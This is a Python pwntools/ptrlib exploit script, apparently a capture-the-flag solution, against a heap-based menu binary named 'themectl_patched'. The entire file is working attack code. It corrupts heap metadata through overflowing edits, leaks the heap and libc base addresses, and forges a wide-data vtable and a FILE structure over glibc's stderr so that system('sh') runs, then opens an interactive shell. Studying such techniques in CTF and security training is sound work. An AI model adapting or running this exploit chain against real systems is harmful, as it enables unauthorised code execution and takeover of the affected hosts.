#!/usr/bin/env python
import sys
import ptrlib as ptr
import pwn

exe = ptr.ELF("./themectl_patched")
pwn.context.binary = pwn.ELF(exe.filepath)
libc = ptr.ELF("./libc.so.6")
ld = ptr.ELF("./ld-linux-x86-64.so.2")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return pwn.remote("localhost", 5000)
    else:
        return pwn.process(exe.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("Failed to unwrap")
        exit(1)
    else:
        return x


def main():
    io = connect()

    def register(username: bytes, password: bytes, theme_count: int):
        io.sendlineafter(b"> ", b"1")
        io.sendlineafter(b"Username: ", username)
        io.sendlineafter(b"password: ", password)
        io.sendlineafter(b"like? ", str(theme_count).encode())
        return

    def edit(idx: int, data: bytes):
        io.sendlineafter(b"> ", b"1")
        io.sendlineafter(b"edit? ", str(idx).encode())
        io.sendlineafter(b"idea: ", data)
        return

    def view(idx: int) -> bytes:
        io.sendlineafter(b"> ", b"2")
        io.sendlineafter(b"view? ", str(idx).encode())
        return io.recvuntil(b"\n--- OPTIONS --- \n", drop=True)

    def logout():
        io.sendlineafter(b"> ", b"4")
        return

    def login(username: bytes, password: bytes):
        io.sendlineafter(b"> ", b"2")
        io.sendlineafter(b"Username: ", username)
        io.sendlineafter(b"password: ", password)
        return

    # register(b"dummy", b"dummy", 1)
    # logout()

    register(b"1", b"1", 1)
    edit(0, b"A" * 8)
    logout()

    register(b"2", b"2", 2)
    edit(0, b"B" * 8)
    logout()

    login(b"1", b"1")
    edit(0, b"A" * 0x40)
    logout()

    login(b"2", b"2")
    edit(1, b"C" * 8)
    logout()

    login(b"1", b"1")
    leak = view(0).split(b"A" * 0x40)[1]
    heap_base = ptr.u64(leak) - 0x4D0
    ptr.logger.info(f"heap_base: {hex(heap_base)}")
    logout()

    login(b"2", b"2")
    edit(1, b"C" * 0x28 + ptr.p64(0xB11) + b"C" * 0x30)
    logout()

    register(b"3", b"3", 355)
    logout()

    login(b"1", b"1")
    edit(0, b"B" * 0x40 + ptr.p64(heap_base + 0x560) + ptr.p32(0x21))
    logout()

    login(b"2", b"2")
    libc.base = ptr.u64(view(1)) - unwrap(libc.symbol("main_arena")) - 96
    logout()

    register(b"4", b"4", 72)
    logout()

    fake_vtable = b""
    fake_vtable = fake_vtable.ljust(0x68, b"\0")
    fake_vtable += ptr.p64(unwrap(libc.symbol("system")))
    fake_vtable = fake_vtable.ljust(0x100, b"\0")

    fake_wide_data = b""
    fake_wide_data = fake_wide_data.ljust(0xE0, b"\0")
    fake_wide_data += ptr.p64(heap_base + 0x810 + 0x100)  # = &fake_vtable
    fake_wide_data = fake_wide_data.ljust(0x100, b"\0")

    payload = fake_wide_data + fake_vtable

    login(b"3", b"3")
    edit(0, payload)
    logout()

    fake_file = pwn.FileStructure()
    fake_file.flags = b"  sh;"
    fake_file._IO_write_ptr = 1
    fake_file._IO_write_base = 0
    fake_file._wide_data = heap_base + 0x810
    fake_file.vtable = unwrap(libc.symbol("_IO_wfile_jumps"))

    payload = bytes(fake_file)

    login(b"1", b"1")
    edit(
        0, b"C" * 0x40 + ptr.p64(unwrap(libc.symbol("_IO_2_1_stderr_"))) + ptr.p32(0x21)
    )
    logout()

    login(b"2", b"2")
    edit(1, payload)  # fake file
    logout()

    io.sendlineafter(b"> ", b"3")

    io.interactive()
    return


if __name__ == "__main__":
    main()
